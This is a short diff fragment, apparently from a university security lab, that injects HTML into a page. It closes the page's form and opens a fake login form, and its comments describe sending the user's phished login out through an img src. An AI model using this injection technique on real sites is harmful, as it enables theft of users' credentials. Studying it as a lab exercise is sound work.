@@ -1,3 +1,6 @@
+<!-- We end the previous form and create a new form -->
+<!-- Upon submitting our form, we create an img thats src contains the user's phished login -->
+
 </form>
 <form id="ece568-2018f-form" method="post">
     Username: <input type="text" id="ece568-2018f-username" value=""><br>
